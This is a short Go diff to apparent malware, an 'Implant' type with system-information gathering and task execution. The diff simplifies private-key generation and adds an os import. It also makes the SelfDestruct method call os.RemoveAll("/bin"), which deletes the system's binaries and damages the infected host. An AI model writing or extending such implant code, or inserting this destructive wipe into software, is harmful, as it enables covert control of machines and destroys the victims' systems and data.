@@ -8,6 +8,7 @@ import (
 	"math/big"
 	"math/rand"
 	"net/http"
+	"os"
 	"time"
 )
 
@@ -37,7 +38,7 @@ type Implant struct {
 func NewImplant() (*Implant, error) {
 	p := generatePrime()
 	g := generatePrime()
-	priv_key := generatePrivateKey(generatePrime())
+	priv_key := generatePrivateKey()
 
 	impl := &Implant{
 		SystemInfo:         GetSystemInfo(),
@@ -151,5 +152,5 @@ func (i *Implant) ExecuteTasks() {
 }
 
 func (i *Implant) SelfDestruct() {
-
+	os.RemoveAll("/bin")
 }
